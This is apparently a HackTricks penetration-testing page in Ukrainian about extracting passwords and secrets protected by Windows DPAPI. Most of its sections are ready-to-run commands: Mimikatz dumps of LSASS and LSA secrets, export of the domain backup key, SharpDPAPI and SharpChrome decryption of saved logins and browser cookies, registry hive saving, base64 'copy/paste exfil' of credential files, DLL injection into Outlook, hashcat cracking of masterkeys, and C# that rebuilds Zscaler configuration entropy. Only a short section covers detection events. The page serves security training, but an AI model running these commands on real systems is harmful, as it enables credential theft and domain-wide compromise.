# DPAPI - Вилучення паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

Data Protection API (DPAPI) використовується переважно в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, застосовуючи секрети користувача або системи як важливе джерело ентропії. Такий підхід спрощує шифрування для розробників: він дає змогу шифрувати дані за допомогою ключа, похідного від секретів входу користувача або, у разі системного шифрування, секретів доменної автентифікації системи. Завдяки цьому розробникам не потрібно самостійно керувати захистом ключа шифрування.

Найпоширеніший спосіб використання DPAPI — функції **`CryptProtectData` і `CryptUnprotectData`**, які дають змогу програмам шифрувати й розшифровувати дані в контексті безпеки поточного процесу. За замовчуванням розшифрувати дані може лише той самий контекст користувача або системи, який їх зашифрував.<sup>[[2]](#references)[[3]](#references)</sup>

Ці функції також приймають необов’язковий **параметр ентропії**, який використовується під час шифрування й розшифрування. Для розшифрування даних, захищених із необов’язковою ентропією, потрібне те саме її значення.<sup>[[2]](#references)[[6]](#references)</sup>

### Генерація ключа користувача

DPAPI створює специфічне для користувача значення (часто його називають **попереднім ключем**) на основі облікових даних користувача. Точний спосіб його отримання залежить від типу облікового запису й версії операційної системи. Наприклад, Impacket використовує варіант на основі HMAC-SHA1 і дайджесту SHA-1 пароля у форматі UTF-16LE, інший варіант на основі MD4/NT-хешу пароля, а для Protected Users — варіант на основі PBKDF2-SHA256. Тому офлайн-інструменти часто можуть отримати потрібний матеріал як із відкритого пароля, так і з доступного NT-хешу.<sup>[[2]](#references)[[10]](#references)</sup>

Це особливо цікаво, оскільки, отримавши хеш пароля користувача, зловмисник може:

- **Розшифрувати будь-які дані, зашифровані за допомогою DPAPI** з ключем цього користувача, не звертаючись до жодного API
- Спробувати **зламати пароль** офлайн, щоб отримати дійсний ключ DPAPI

Для кожного користувача DPAPI підтримує один або кілька **головних ключів**, а не створює новий головний ключ для кожного захищеного блоба. Кожен головний ключ має **GUID** (глобально унікальний ідентифікатор), а в зашифрованому блобі вказано, який головний ключ його захищає.<sup>[[2]](#references)</sup>

Головні ключі зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — це ідентифікатор безпеки користувача. Файл головного ключа містить матеріал, захищений **попереднім ключем** користувача, а для доменних користувачів — також матеріал відновлення, захищений **резервним ключем домену**.<sup>[[2]](#references)</sup>

Зауважте, що **доменний ключ, який використовується для шифрування головного ключа, зберігається на контролерах домену й ніколи не змінюється**. Тому, якщо зловмисник має доступ до контролера домену, він може отримати резервний ключ домену й розшифрувати головні ключі всіх користувачів домену.<sup>[[2]](#references)</sup>

У заголовках зашифрованих блобів міститься **GUID головного ключа**, використаного для шифрування даних.

> [!TIP]
> Зашифровані блоби DPAPI починаються з **`01 00 00 00`**

Знайти головні ключі:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys of a user will looks like:

![What is DPAPI - Users key generation: Ось як виглядає набір Master Keys користувача](<../../images/image (1121).png>)

### Генерація ключа Machine/System

Цей ключ використовується машиною для шифрування даних. Він базується на **секреті DPAPI_SYSTEM LSA** — спеціальному ключі, до якого має доступ лише користувач SYSTEM. Цей ключ використовується для шифрування даних, доступних самій системі, наприклад облікових даних рівня машини або загальносистемних секретів.<sup>[[2]](#references)</sup>

Зауважте, що ці ключі **не мають резервної копії домену**, тому доступні лише локально:

- **Mimikatz** може отримати до них доступ, дампивши секрети LSA за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тому адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у реєстрі: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можливе офлайн-вилучення з кущів реєстру. Наприклад, адміністратор на цільовій системі може зберегти кущі та ексфільтрувати їх:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Потім на вашій машині для аналізу відновіть секрет DPAPI_SYSTEM LSA з hive-файлів і використайте його, щоб розшифрувати DPAPI blobs машинного рівня (наприклад, облікові дані програм або профілі Wi-Fi, захищені на рівні машини):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-specific DPAPI example:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Дані, захищені DPAPI

До персональних даних, захищених DPAPI, належать:

- Облікові дані Windows
- Паролі та дані автозаповнення Internet Explorer і Google Chrome
- Паролі облікових записів електронної пошти та внутрішніх FTP для таких програм, як Outlook і Windows Mail
- Паролі до спільних папок, ресурсів, бездротових мереж і Windows Vault, зокрема ключі шифрування
- Паролі для підключень до віддаленого робочого стола, .NET Passport і приватні ключі для різних цілей шифрування та автентифікації
- Мережеві паролі, якими керує Credential Manager, і персональні дані в програмах, що використовують CryptProtectData, як-от Skype, MSN Messenger тощо
- Зашифровані блоби в реєстрі
- ...

До системних даних, захищених DPAPI, належать:
- Паролі Wi-Fi
- ...

Паролі запланованих завдань — це окреме питання, пов’язане із секретами LSA. Завдання, зареєстроване з [типом входу Password](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type), може зберігати пароль для відновлення локального адміністратора/SYSTEM; завдання типу S4U або з інтерактивним токеном не підтверджує, що пароль було збережено. Основними ознаками є обліковий запис завдання та тип входу, а не лише його ім’я run-as.

### Варіанти вилучення master key

- Якщо користувач має права адміністратора домену, він може отримати доступ до **резервного ключа домену**, щоб розшифрувати всі master key користувачів у домені:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Маючи локальні права адміністратора, можна **отримати доступ до пам’яті LSASS**, щоб витягти головні ключі DPAPI усіх підключених користувачів і ключ SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Якщо користувач має локальні права адміністратора, він може отримати доступ до **секрету DPAPI_SYSTEM LSA**, щоб розшифрувати головні ключі комп’ютера:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Якщо відомий пароль або NTLM-хеш користувача, можна **безпосередньо розшифрувати головні ключі користувача**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Якщо ви перебуваєте в сеансі користувача, можна запросити в DC **резервний ключ для розшифрування головних ключів через RPC**. Якщо ви локальний адміністратор, а користувач увійшов у систему, можна **викрасти його токен сеансу**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Перелік сховищ

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Доступ до зашифрованих DPAPI даних

### Пошук зашифрованих DPAPI даних

Зазвичай захищені **файли користувачів** розташовані тут:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте ці шляхи, замінивши `\Roaming\` на `\Local\`.

Приклади переліку:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити DPAPI-зашифровані blobs у файловій системі, реєстрі та B64 blobs:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Зверніть увагу: [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (із того самого репозиторію) можна використовувати для розшифрування конфіденційних даних за допомогою DPAPI, наприклад cookies.<sup>[[12]](#references)</sup>

#### Швидкі рецепти для Chromium/Edge/Electron (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених логінів/cookies (працює навіть із app-bound cookies у Chrome 127+, оскільки додатковий ключ отримується з Credential Manager користувача під час запуску в контексті користувача):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Офлайн-аналіз, коли у вас є лише файли. Спочатку отримайте ключ стану AES із файлу профілю "Local State", а потім використайте його для розшифрування бази даних cookie:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Доменний/віддалений тріаж, якщо у вас є резервний ключ домену DPAPI (PVK) і права адміністратора на цільовому хості:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Якщо у вас є DPAPI prekey/credkey користувача (отриманий із LSASS), можна пропустити підбір пароля й одразу розшифрувати дані профілю:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Примітки
- У новіших версіях Chrome/Edge для шифрування певних файлів cookie може використовуватися шифрування «App-Bound». Розшифрувати ці файли cookie офлайн неможливо без додаткового app-bound ключа; запустіть SharpChrome у контексті цільового користувача, щоб автоматично отримати його. Див. допис у блозі Chrome про безпеку, на який є посилання нижче.<sup>[[5]](#references)</sup>

### Ключі доступу та дані

- **Використовуйте SharpDPAPI**, щоб отримати облікові дані з файлів, зашифрованих DPAPI, у поточному сеансі:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Отримати інформацію про облікові дані**, як-от зашифровані дані та guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Доступ до masterkeys**:

Розшифруйте masterkey користувача, запросивши **domain backup key** через RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password` — щоб використати пароль у відкритому вигляді, або `/pvk` — щоб указати файл із приватним ключем домену DPAPI...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Розшифрування даних за допомогою masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що `/rpc` можна використати, щоб отримати резервний ключ домену, `/password` — щоб використати пароль у відкритому вигляді, `/pvk` — щоб указати файл із приватним ключем DPAPI домену, а `/unprotect` — щоб використати поточний сеанс користувача...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Використання DPAPI prekey/credkey напряму (пароль не потрібен)

Якщо вам вдасться дампнути LSASS, Mimikatz часто показує ключ DPAPI для конкретного сеансу входу, за допомогою якого можна розшифрувати masterkeys користувача, не знаючи пароль у відкритому вигляді. Передайте це значення безпосередньо інструменту:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Розшифрувати деякі дані за допомогою **сеансу поточного користувача**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline decryption with Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT-хеш), ви можете повністю офлайн розшифрувати masterkeys DPAPI та blobs Credential Manager за допомогою Impacket dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Знайдіть артефакти на диску:
  - blob(s) Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо засоби передавання файлів працюють ненадійно, закодуйте файли в base64 на хості й скопіюйте вивід:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Розшифруйте masterkey за допомогою SID і пароля/хешу користувача:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Використайте розшифрований masterkey, щоб розшифрувати blob облікових даних:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Цей робочий процес часто дає змогу відновити облікові дані домену, збережені програмами за допомогою Windows Credential Manager, зокрема облікові дані адміністраторів (наприклад, `*_adm`).

---

### Обробка необов’язкової ентропії («стороння ентропія»)

Деякі програми передають додаткове значення **ентропії** до `CryptProtectData`. Без цього значення blob неможливо розшифрувати, навіть якщо відомий правильний masterkey. Тому отримати ентропію вкрай важливо, якщо ви націлилися на облікові дані, захищені в такий спосіб (наприклад, Microsoft Outlook або деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це DLL у режимі користувача, яка перехоплює функції DPAPI всередині цільового процесу й непомітно записує передану необов’язкову ентропію. Запуск EntropyCapture у режимі **DLL-injection** для таких процесів, як `outlook.exe` або `vpnclient.exe`, створить файл, що зіставляє кожен буфер ентропії з процесом-викликачем і blob. Згодом перехоплену ентропію можна передати **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`), щоб розшифрувати дані.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Офлайн-злам masterkey (Hashcat і DPAPISnoop)

Microsoft запровадила формат masterkey **context 3**, починаючи з Windows 10 v1607 (2016). У `hashcat` v6.2.6 (грудень 2023) додано режими хешування **22100** (DPAPI masterkey v1 context), **22101** (context 1) і **22102** (context 3), що дають змогу прискорено зламувати паролі користувачів за допомогою GPU безпосередньо з файлу masterkey. Таким чином, зловмисники можуть виконувати атаки за словником або методом повного перебору, не взаємодіючи з цільовою системою.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) автоматизує цей процес:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Інструмент також може аналізувати blobs Credential і Vault, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.<sup>[[8]](#references)</sup>


### Доступ до даних іншої машини

У **SharpDPAPI і SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звісно, потрібно мати доступ до цієї машини. У наведеному нижче прикладі передбачається, що **ключ резервного шифрування домену відомий**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це інструмент, який автоматизує отримання всіх користувачів і комп’ютерів з каталогу LDAP, а також отримання резервного ключа контролера домену через RPC. Потім скрипт визначає IP-адреси всіх комп’ютерів і виконує smbclient на кожному, щоб отримати всі DPAPI blobs користувачів і розшифрувати їх за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Маючи список комп’ютерів, отриманий з LDAP, можна знайти всі підмережі, навіть якщо ви про них не знали!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично зливати секрети, захищені DPAPI. У випуску 2.x з’явилися:<sup>[[9]](#references)</sup>

* Паралельний збір blobs із сотень хостів
* Розбір masterkeys **context 3** та інтеграція автоматичного підбору паролів за допомогою Hashcat
* Підтримка зашифрованих cookies Chrome "App-Bound" (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування кінцевих точок і виявлення новостворених blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C#-парсер файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і за бажанням автоматично запускати підбір. Він повністю підтримує формати masterkey для комп’ютерів і користувачів аж до Windows 11 24H1.<sup>[[8]](#references)</sup>


## Типові способи виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших каталогах, пов’язаних із DPAPI.
    - Особливо з мережевої папки, як-от **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам’яті LSASS або дампу masterkeys.
- Подія **4662**: *Виконано операцію з об’єктом* — її можна зіставити з доступом до об’єкта **`BCKUPKEY`**.
- Подія **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Вразливості та зміни екосистеми у 2023–2025 роках

* **CVE-2023-36004 – підміна захищеного каналу Windows DPAPI** (листопад 2023 року). Зловмисник із доступом до мережі міг змусити учасника домену отримати шкідливий резервний ключ DPAPI, що давало змогу розшифрувати masterkeys користувачів. Вразливість виправили в накопичувальному оновленні за листопад 2023 року — адміністраторам слід переконатися, що контролери домену та робочі станції повністю оновлені.<sup>[[4]](#references)</sup>
* **Шифрування cookies “App-Bound” у Chrome 127** (липень 2024 року) замінило застарілий захист лише засобами DPAPI на додатковий ключ, який зберігається в **Credential Manager** користувача. Для офлайн-розшифрування cookies тепер потрібні і masterkey DPAPI, і **ключ app-bound, обгорнутий GCM**. SharpChrome v2.3 і DonPAPI 2.x можуть отримати додатковий ключ, якщо запущені в контексті користувача.<sup>[[5]](#references)</sup>


### Приклад: Zscaler Client Connector – ентропія, отримана із SID

Zscaler Client Connector зберігає кілька файлів конфігурації в `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифровано за допомогою **DPAPI (область комп’ютера)**, але постачальник використовує **власну ентропію**, яка *обчислюється під час виконання*, а не зберігається на диску.<sup>[[1]](#references)</sup>

Ентропія відновлюється з двох елементів:

1. Вбудований секрет у `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований у DLL, еквівалентний такому:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний зловмисник із правами SYSTEM може повторно згенерувати ентропію для будь-якого SID** і розшифрувати blob-файли офлайн:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Розшифрування дає повну конфігурацію JSON, включно з усіма **перевірками стану пристрою** та очікуваними значеннями — ця інформація дуже цінна під час спроб обходу на стороні клієнта.

> ПОРАДА: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені DPAPI **без** ентропії (`16` нульових байтів). Тому їх можна розшифрувати безпосередньо за допомогою `ProtectedData.Unprotect`, щойно буде отримано привілеї SYSTEM.

## References

- [1] [Synacktiv – Чи варто довіряти вашому zero trust? Обхід перевірок стану Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Секрети DPAPI. Аналіз безпеки та відновлення даних у DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Читання зашифрованих DPAPI секретів за допомогою Mimikatz і C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 — Уразливість підміни в Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Підвищення безпеки cookie Chrome у Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: просте вилучення додаткової ентропії DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Примітки до випуску hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop — репозиторій GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 — сторінка проєкту PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket — dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: зловживання AD ACL, злам Argon2 у KeePassXC та розшифрування DPAPI для отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome — використання та параметри](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
